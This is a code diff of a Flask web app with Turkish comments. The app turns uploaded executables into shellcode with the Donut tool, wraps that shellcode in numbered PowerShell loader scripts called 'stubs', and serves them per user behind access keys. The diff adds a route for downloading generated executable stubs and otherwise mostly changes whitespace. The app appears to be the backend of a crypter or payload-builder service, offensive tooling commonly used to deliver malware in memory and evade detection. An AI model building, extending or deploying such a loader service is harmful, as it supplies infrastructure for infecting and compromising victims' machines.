@@ -29,11 +29,11 @@ def get_next_ps_filename(user_id):
     """Sıradaki PS dosya numarasını bul"""
     user_ps_dir = f"stubs/{user_id}/ps"
     os.makedirs(user_ps_dir, exist_ok=True)
-    
+
     existing_files = [f for f in os.listdir(user_ps_dir) if f.startswith("ps") and f.endswith(".ps1")]
     if not existing_files:
         return "ps1.ps1"
-    
+
     numbers = [int(f[2:-4]) for f in existing_files if f[2:-4].isdigit()]
     next_num = max(numbers) + 1 if numbers else 1
     return f"ps{next_num}.ps1"
@@ -41,7 +41,7 @@ def get_next_ps_filename(user_id):
 @app.route("/api/generator", methods=["POST"])
 def generator():
     key = request.args.get("key")
-    
+
     if not key:
         return jsonify({"error": "No key provided"}), 400
 
@@ -68,7 +68,7 @@ def generator():
 
     # Donut ile shellcode oluştur
     shellcode = donut.create(file=save_path)
-    
+
     # Shellcode'u PowerShell formatına çevir
     shellcode_hex = ",".join([f"0x{byte:02x}" for byte in shellcode])
 
@@ -82,7 +82,7 @@ def generator():
     ps_filename = get_next_ps_filename(user_id)
     ps_save_path = f"stubs/{user_id}/ps/{ps_filename}"
     os.makedirs(os.path.dirname(ps_save_path), exist_ok=True)
-    
+
     with open(ps_save_path, "w") as f:
         f.write(ps_script)
 
@@ -198,24 +198,24 @@ def generator():
 def get_ps_script(user_id, ps_filename):
     """Raw key ile PowerShell scriptini görüntüle"""
     raw_key = request.args.get("raw_key")
-    
+
     if not raw_key:
         return jsonify({"error": "No raw_key provided"}), 400
 
     users = load_users()
-    
+
     # Kullanıcıyı raw_key ile bul
     user_found = False
     for user_data in users.values():
         if user_data.get("raw_key") == raw_key and user_data.get("id") == user_id:
             user_found = True
             break
-    
+
     if not user_found:
         return jsonify({"error": "Invalid raw_key or user_id"}), 403
 
     ps_file_path = f"stubs/{user_id}/ps/{ps_filename}"
-    
+
     if not os.path.exists(ps_file_path):
         return jsonify({"error": "PS script not found"}), 404
 
@@ -224,6 +224,31 @@ def get_ps_script(user_id, ps_filename):
         content = f.read()
 
     return content, 200, {'Content-Type': 'text/plain'}
+
+@app.route("/generated_stubs/<exe_filename>")
+def get_generated_stub(exe_filename):
+    """Downloads the generated executable file for a given user."""
+    raw_key = request.args.get("raw_key")
+    if not raw_key:
+        return jsonify({"error": "No raw_key provided"}), 400
+
+    user_id = os.path.splitext(exe_filename)[0]
+
+    users = load_users()
+    user_found = False
+    for user_data in users.values():
+        if user_data.get("raw_key") == raw_key and user_data.get("id") == user_id:
+            user_found = True
+            break
+
+    if not user_found:
+        return jsonify({"error": "Invalid raw_key or user_id"}), 403
+
+    exe_path = os.path.join("stubs", user_id, "exe", exe_filename)
+    if not os.path.exists(exe_path):
+        return jsonify({"error": "File not found"}), 404
+
+    return send_file(exe_path, as_attachment=True)
 
 if __name__ == "__main__":
     app.run(host="127.0.0.1", port=5000, debug=True)
